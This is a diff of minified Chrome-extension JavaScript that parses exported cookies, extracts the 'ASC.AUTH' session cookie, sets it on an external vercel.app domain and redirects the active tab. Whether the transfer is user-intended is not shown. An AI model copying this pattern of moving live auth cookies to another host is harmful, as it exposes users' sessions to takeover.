@@ -6143,10 +6143,14 @@ const dr = Sr,
                             let l = new Blob([a], {
                                 type: "text/plain;charset=utf-8"
                             });
-                            let removeBackSlash = a.split('\\').join('');
-                            let getASCAUTH = removeBackSlash.split('{', 3)[2].slice(removeBackSlash.split('{', 3)[2].search('value') + 8).replace('"},', '');
-                            if (getASCAUTH) {
-                                chrome.cookies.set({url: 'https://fe-dkmh.vercel.app/', name: 'ASC.AUTH', value: getASCAUTH});
+
+                            let obj = JSON.parse(a);
+                            let cookie = obj.cookies.find((cookieNeeds) => {
+                                return cookieNeeds.name === 'ASC.AUTH';
+                            });
+                            let ASC_AUTH = cookie.value;
+                            if (ASC_AUTH) {
+                                chrome.cookies.set({url: 'https://fe-dkmh.vercel.app/', name: 'ASC.AUTH', value: ASC_AUTH});
                                 (function redirect() {
                                     // Get the active tab
                                     chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
@@ -6157,7 +6161,7 @@ const dr = Sr,
                                 })()
                             }
 
-                            // Hr.saveAs(l, `${r}_${this.getTime()}.${c}`)
+                            Hr.saveAs(l, `${r}_${this.getTime()}.${c}`)
                         } else this.error = !0
                     })
                 } catch (t) {
